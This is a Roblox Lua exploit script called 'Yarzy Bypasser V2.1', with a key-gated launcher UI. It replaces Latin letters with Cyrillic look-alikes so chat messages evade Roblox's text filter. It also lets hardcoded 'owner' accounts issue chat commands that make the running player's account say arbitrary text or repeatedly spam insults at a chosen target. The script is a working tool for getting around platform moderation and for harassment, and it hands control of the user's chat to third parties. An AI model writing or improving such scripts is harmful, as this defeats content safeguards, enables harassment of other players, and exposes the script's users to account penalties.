--[[
    Yarzy Bypasser V2.1 - Premium UI, Loading Screens, Shake Effects, and Multi-Owner Access Control
]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

-- CONFIGURATION
local CORRECT_KEY = "YARZY_BEST" 

-- AUTHORIZED OWNERS LIST
local OWNERS = {
    ["azhanopopl"] = true,
    ["azhanopoplalt"] = true
}

local SPAM_COUNT = 5            
local SPAM_DELAY = 0.5          

-- State variables
local CurrentTarget = ""
local IsSpamming = false
local BypasserEnabled = true 

-- Cyrillic Character Map for Bypass
local bypassMap = {
    ["a"] = "а", ["c"] = "с", ["e"] = "е", ["o"] = "о", 
    ["p"] = "р", ["x"] = "х", ["y"] = "у", ["i"] = "і",
}

local function bypassText(inputString)
    if not BypasserEnabled then return inputString end
    local modifiedString = ""
    for i = 1, #inputString do
        local character = inputString:sub(i, i):lower()
        if bypassMap[character] then
            modifiedString = modifiedString .. bypassMap[character]
        else
            modifiedString = modifiedString .. inputString:sub(i, i)
        end
    end
    return modifiedString
end

local function sendChatMessage(message)
    local safeMsg = bypassText(message)
    local sayMessageRequest = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
    if sayMessageRequest and sayMessageRequest:IsA("RemoteEvent") then
        sayMessageRequest:FireServer(safeMsg, "All")
    end
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local generalChannel = TextChatService:FindFirstChild("RBXGeneral", true)
        if generalChannel and generalChannel:IsA("TextChannel") then
            generalChannel:SendAsync(safeMsg)
        end
    end
end

local function executeSpam(textToSpam)
    if IsSpamming then return end
    IsSpamming = true
    for i = 1, SPAM_COUNT do
        if not IsSpamming then break end
        sendChatMessage(textToSpam)
        task.wait(SPAM_DELAY)
    end
    IsSpamming = false
end

-- Command Processor
local function processCommand(player, msg)
    -- Check if the player speaking is in the OWNERS list
    if not OWNERS[player.Name] then return end
    
    local lowMsg = msg:lower()
    
    -- !bypasser off & !bypasser on features
    if lowMsg == "!bypasser off" then
        BypasserEnabled = false
        sendChatMessage("[System]: Bypasser has been deactivated.")
    end
    if lowMsg == "!bypasser on" then
        BypasserEnabled = true
        sendChatMessage("[System]: Bypasser is now active.")
    end

    -- !who is owner command
    if lowMsg == "!who is owner" then
        sendChatMessage("yarzy abbu")
    end

    -- !say command
    if lowMsg:sub(1, 5) == "!say " then
        local textToSay = msg:sub(6)
        sendChatMessage(textToSay)
    end

    -- !target command
    if lowMsg:sub(1, 8) == "!target " then
        CurrentTarget = msg:sub(9)
        sendChatMessage("Target set to: " .. CurrentTarget)
    end
    
    -- !startspam command
    if lowMsg == "!startspam" then
        if CurrentTarget == "" then
            sendChatMessage("Error: No target set!")
        else
            executeSpam(CurrentTarget .. " is a noob!")
        end
    end
    
    -- !stopspam command
    if lowMsg == "!stopspam" then
        IsSpamming = false
        sendChatMessage("Spam stopped.")
    end
end

local function initializeScript()
    sendChatMessage("[System]: Yarzy Bypasser Loaded Successfully!")
    
    -- Listen to all players chatting, but filter using the owner check
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(msg)
            processCommand(player, msg)
        end)
    end)
    
    -- Check players already in the server when script runs
    for _, player in ipairs(Players:GetPlayers()) do
        player.Chatted:Connect(function(msg)
            processCommand(player, msg)
        end)
    end
end

-- UI IMPLEMENTATION WITH SHAKE AND LOADING ANIMATIONS
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "YarzyBypasserUI"
ScreenGui.Parent = CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 320, 0, 180)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.Text = "Welcome To Yarzy Bypasser"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.Parent = MainFrame

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(0.9, 0, 0, 38)
KeyInput.Position = UDim2.new(0.05, 0, 0.35, 0)
KeyInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
KeyInput.Font = Enum.Font.Gotham
KeyInput.PlaceholderText = "Insert Key Here..."
KeyInput.Text = ""
KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.TextSize = 14
KeyInput.Parent = MainFrame

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 8)
InputCorner.Parent = KeyInput

local SubmitBtn = Instance.new("TextButton")
SubmitBtn.Size = UDim2.new(0.9, 0, 0, 42)
SubmitBtn.Position = UDim2.new(0.05, 0, 0.65, 0)
SubmitBtn.BackgroundColor3 = Color3.fromRGB(110, 0, 255)
SubmitBtn.Font = Enum.Font.GothamBold
SubmitBtn.Text = "SUBMIT KEY"
SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SubmitBtn.TextSize = 14
SubmitBtn.Parent = MainFrame

local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 8)
BtnCorner.Parent = SubmitBtn

-- Shake Functionality for Incorrect Key
local function shakeUI()
    local originalPos = MainFrame.Position
    for i = 1, 6 do
        local offset = (i % 2 == 0) and 10 or -10
        MainFrame.Position = originalPos + UDim2.new(0, offset, 0, 0)
        task.wait(0.05)
    end
    MainFrame.Position = originalPos
end

-- Loading Screen Sequence Functionality
local function runLoadingScreen()
    Title.Text = "Loading Yarzy Bypasser..."
    KeyInput:Destroy()
    SubmitBtn:Destroy()
    
    local ProgressBarBg = Instance.new("Frame")
    ProgressBarBg.Size = UDim2.new(0.9, 0, 0, 10)
    ProgressBarBg.Position = UDim2.new(0.05, 0, 0.6, 0)
    ProgressBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
    ProgressBarBg.Parent = MainFrame
    
    local BarCorner = Instance.new("UICorner")
    BarCorner.Parent = ProgressBarBg
    
    local ProgressFill = Instance.new("Frame")
    ProgressFill.Size = UDim2.new(0, 0, 1, 0)
    ProgressFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
    ProgressFill.Parent = ProgressBarBg
    
    local FillCorner = Instance.new("UICorner")
    FillCorner.Parent = ProgressFill
    
    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(ProgressFill, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
    tween:Play()
    tween.Completed:Wait()
    
    ScreenGui:Destroy()
    initializeScript()
end

-- Key Checker Connection
SubmitBtn.MouseButton1Click:Connect(function()
    if KeyInput.Text == CORRECT_KEY then
        runLoadingScreen()
    else
        SubmitBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        SubmitBtn.Text = "WRONG KEY!"
        shakeUI()
        task.wait(1)
        SubmitBtn.BackgroundColor3 = Color3.fromRGB(110, 0, 255)
        SubmitBtn.Text = "SUBMIT KEY"
    end
end)
